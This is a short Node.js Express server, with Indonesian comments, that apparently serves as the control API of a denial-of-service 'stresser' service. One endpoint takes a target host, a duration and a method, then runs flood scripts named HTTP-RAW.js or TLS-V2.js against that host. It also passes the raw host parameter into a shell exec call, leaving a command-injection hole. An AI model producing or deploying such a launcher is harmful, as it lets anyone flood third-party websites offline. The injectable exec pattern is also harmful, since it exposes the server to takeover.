const express = require('express');
const { exec } = require('child_process');
const app = express();

app.use(express.json());

app.get('/', (req, res) => {
    const { host, time, method } = req.query;

    // Maksimal waktu adalah 120
    const maxTime = 120;

    // Verifikasi bahwa time adalah angka dan tidak melebihi batas maksimal
    if (method === 'HTTP' && host && time && !isNaN(time) && time <= maxTime) {
        const command = `node HTTP-RAW.js ${host} ${time}`;
        exec(command, (error, stdout, stderr) => {
            if (error) {
                res.status(500).send(`Error: ${error.message}`);
            } else {
                res.send(`Code triggered with host=${host} and time=${time} using HTTP-RAW`);
            }
        });
    } else if (method === 'TLS' && host && time && !isNaN(time) && time <= maxTime) {
        const command = `node TLS-V2.js ${host} ${time} 8 1`;
        exec(command, (error, stdout, stderr) => {
            if (error) {
                res.status(500).send(`Error: ${error.message}`);
            } else {
                res.send(`Code triggered with host=${host} and time=${time} using TLS-V2`);
            }
        });
    } else {
        res.status(400).send('Invalid method, missing parameters, or invalid time value');
    }
});

const port = 8080;
app.listen(port, () => {
    console.log(`Server is running at http://localhost:${port}`);
});
